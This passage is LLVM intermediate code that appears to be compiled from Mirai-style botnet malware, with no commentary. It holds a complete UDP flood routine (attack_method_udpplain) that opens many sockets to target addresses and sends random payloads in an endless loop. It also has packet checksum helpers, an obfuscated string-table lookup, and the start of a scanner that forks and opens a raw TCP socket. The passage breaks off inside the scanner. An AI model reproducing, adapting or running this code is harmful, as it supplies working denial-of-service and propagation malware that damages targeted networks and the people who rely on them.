
69:                                               ; preds = %64, %60, %56
  %70 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %71 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %72 = load i32, i32* %4, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %6, align 4
  %76 = load i32, i32* %4, align 4
  %77 = sub nsw i32 %75, %76
  call void @util_memcpy(i8* noundef %70, i8* noundef %74, i32 noundef %77)
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub nsw i32 %78, %79
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %81
  store i8 0, i8* %82, align 1
  store i8 1, i8* %9, align 1
  br label %87

83:                                               ; preds = %64
  br label %84

84:                                               ; preds = %83, %49
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %6, align 4
  br label %30, !llvm.loop !34

87:                                               ; preds = %69, %30
  %88 = load i8, i8* %9, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %93

90:                                               ; preds = %87
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %92 = call i32 @inet_addr(i8* noundef %91) #7
  store i32 %92, i32* %1, align 4
  br label %106

93:                                               ; preds = %87
  br label %94

94:                                               ; preds = %93, %15
  br label %95

95:                                               ; preds = %94, %0
  %96 = call i32 @rand_next()
  %97 = urem i32 %96, 4
  switch i32 %97, label %106 [
    i32 0, label %98
    i32 1, label %100
    i32 2, label %102
    i32 3, label %104
  ]

98:                                               ; preds = %95
  %99 = call i32 @htonl(i32 noundef 134744072) #8
  store i32 %99, i32* %1, align 4
  br label %106

100:                                              ; preds = %95
  %101 = call i32 @htonl(i32 noundef 1246898730) #8
  store i32 %101, i32* %1, align 4
  br label %106

102:                                              ; preds = %95
  %103 = call i32 @htonl(i32 noundef 1074151430) #8
  store i32 %103, i32* %1, align 4
  br label %106

104:                                              ; preds = %95
  %105 = call i32 @htonl(i32 noundef 67240450) #8
  store i32 %105, i32* %1, align 4
  br label %106

106:                                              ; preds = %104, %102, %100, %98, %95, %90
  %107 = load i32, i32* %1, align 4
  ret i32 %107
}

declare i32 @open(i8* noundef, i32 noundef, ...) #4

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpplain(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 noundef %24, i64 noundef 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 7, i32 noundef 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 6, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 0, i32 noundef 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 1, i32 noundef 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %47, i8 0, i64 16, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

51:                                               ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

54:                                               ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 noundef zeroext %55) #8
  store i16 %56, i16* %13, align 2
  br label %57

57:                                               ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

58:                                               ; preds = %170, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %173

63:                                               ; preds = %58
  %64 = call noalias i8* @calloc(i64 noundef 65535, i64 noundef 1) #7
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

72:                                               ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

81:                                               ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 noundef zeroext %82) #8
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

90:                                               ; preds = %81, %72
  %91 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 17) #7
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

97:                                               ; preds = %90
  ret void

98:                                               ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 noundef %108, %struct.sockaddr* %112, i32 noundef 16) #7
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

115:                                              ; preds = %98
  br label %116

116:                                              ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %151

125:                                              ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 noundef %131) #8
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, %141
  %143 = call i32 @htonl(i32 noundef %142) #8
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 0
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %148, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  store i32 %143, i32* %150, align 4
  br label %151

151:                                              ; preds = %125, %116
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  store %struct.sockaddr* %163, %struct.sockaddr** %157, align 8
  %164 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %165 = load %struct.sockaddr*, %struct.sockaddr** %164, align 8
  %166 = call i32 @connect(i32 noundef %156, %struct.sockaddr* %165, i32 noundef 16)
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %151
  br label %169

169:                                              ; preds = %168, %151
  br label %170

170:                                              ; preds = %169
  %171 = load i32, i32* %9, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %9, align 4
  br label %58, !llvm.loop !35

173:                                              ; preds = %58
  br label %174

174:                                              ; preds = %205, %173
  store i32 0, i32* %9, align 4
  br label %175

175:                                              ; preds = %202, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %205

180:                                              ; preds = %175
  %181 = load i8**, i8*** %10, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8*, i8** %181, i64 %183
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %22, align 8
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

188:                                              ; preds = %180
  %189 = load i8*, i8** %22, align 8
  %190 = load i16, i16* %14, align 2
  %191 = zext i16 %190 to i32
  call void @rand_str(i8* noundef %189, i32 noundef %191)
  br label %192

192:                                              ; preds = %188, %180
  %193 = load i32*, i32** %11, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i64
  %201 = call i64 @send(i32 noundef %197, i8* noundef %198, i64 noundef %200, i32 noundef 16384)
  br label %202

202:                                              ; preds = %192
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %9, align 4
  br label %175, !llvm.loop !36

205:                                              ; preds = %175
  br label %174
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @checksum_generic(i16* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

16:                                               ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6, !llvm.loop !37

19:                                               ; preds = %6
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %22, label %29

22:                                               ; preds = %19
  %23 = load i16*, i16** %3, align 8
  %24 = load i16, i16* %23, align 2
  %25 = trunc i16 %24 to i8
  %26 = sext i8 %25 to i64
  %27 = load i64, i64* %5, align 8
  %28 = add i64 %27, %26
  store i64 %28, i64* %5, align 8
  br label %29

29:                                               ; preds = %22, %19
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = load i64, i64* %5, align 8
  %33 = and i64 %32, 65535
  %34 = add i64 %31, %33
  store i64 %34, i64* %5, align 8
  %35 = load i64, i64* %5, align 8
  %36 = lshr i64 %35, 16
  %37 = load i64, i64* %5, align 8
  %38 = add i64 %37, %36
  store i64 %38, i64* %5, align 8
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = trunc i64 %40 to i16
  ret i16 %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %0, i8* noundef %1, i16 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

23:                                               ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

26:                                               ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23, !llvm.loop !38

36:                                               ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

39:                                               ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

46:                                               ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 noundef zeroext %68) #8
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

77:                                               ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

81:                                               ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77, !llvm.loop !39

87:                                               ; preds = %77
  %88 = load i32, i32* %12, align 4
  %89 = xor i32 %88, -1
  %90 = trunc i32 %89 to i16
  ret i16 %90
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @rand_str(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

5:                                                ; preds = %45, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %46

8:                                                ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %21

11:                                               ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 4
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %4, align 4
  br label %45

21:                                               ; preds = %8
  %22 = load i32, i32* %4, align 4
  %23 = icmp sge i32 %22, 2
  br i1 %23, label %24, label %36

24:                                               ; preds = %21
  %25 = call i32 @rand_next()
  %26 = and i32 %25, 65535
  %27 = trunc i32 %26 to i16
  %28 = load i8*, i8** %3, align 8
  %29 = bitcast i8* %28 to i16*
  store i16 %27, i16* %29, align 2
  %30 = load i8*, i8** %3, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 2
  store i8* %31, i8** %3, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sext i32 %32 to i64
  %34 = sub i64 %33, 2
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %4, align 4
  br label %44

36:                                               ; preds = %21
  %37 = call i32 @rand_next()
  %38 = and i32 %37, 255
  %39 = trunc i32 %38 to i8
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %3, align 8
  store i8 %39, i8* %40, align 1
  %42 = load i32, i32* %4, align 4
  %43 = add nsw i32 %42, -1
  store i32 %43, i32* %4, align 4
  br label %44

44:                                               ; preds = %36, %24
  br label %45

45:                                               ; preds = %44, %11
  br label %5, !llvm.loop !40

46:                                               ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @rand_alpha_str(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 noundef zeroext 28)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 0
  %7 = call i8* @table_retrieve_val(i32 noundef 28, i32* noundef null)
  %8 = call i8* @strcpy(i8* noundef %6, i8* noundef %7) #7
  br label %9

9:                                                ; preds = %13, %2
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  br i1 %12, label %13, label %23

13:                                               ; preds = %9
  %14 = call i32 @rand_next()
  %15 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 0
  %16 = call i32 @util_strlen(i8* noundef %15)
  %17 = urem i32 %14, %16
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = load i8*, i8** %3, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %3, align 8
  store i8 %20, i8* %21, align 1
  br label %9, !llvm.loop !41

23:                                               ; preds = %9
  call void @table_lock_val(i8 noundef zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.26, align 8
  %6 = alloca %struct.fd_set.26, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.27, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set.26*, align 8
  %26 = alloca i32, align 4
  %27 = alloca %struct.fd_set.26*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #7
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

49:                                               ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

52:                                               ; preds = %49, %0
  ret void

53:                                               ; preds = %49
  %54 = call i32 @util_local_addr()
  store i32 %54, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %55 = call i64 @time(i64* noundef null) #7
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @fake_time, align 4
  %57 = call noalias i8* @calloc(i64 noundef 256, i64 noundef 296) #7
  %58 = bitcast i8* %57 to %struct.scanner_connection*
  store %struct.scanner_connection* %58, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %59

59:                                               ; preds = %73, %53
  %60 = load i32, i32* %1, align 4
  %61 = icmp slt i32 %60, 256
  br i1 %61, label %62, label %76

62:                                               ; preds = %59
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i64 %65
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 3
  store i32 0, i32* %67, align 8
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %69 = load i32, i32* %1, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i64 %70
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  store i32 -1, i32* %72, align 8
  br label %73

73:                                               ; preds = %62
  %74 = load i32, i32* %1, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %1, align 4
  br label %59, !llvm.loop !42

76:                                               ; preds = %59
  %77 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %77, i32* @rsck, align 4
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %79, label %80

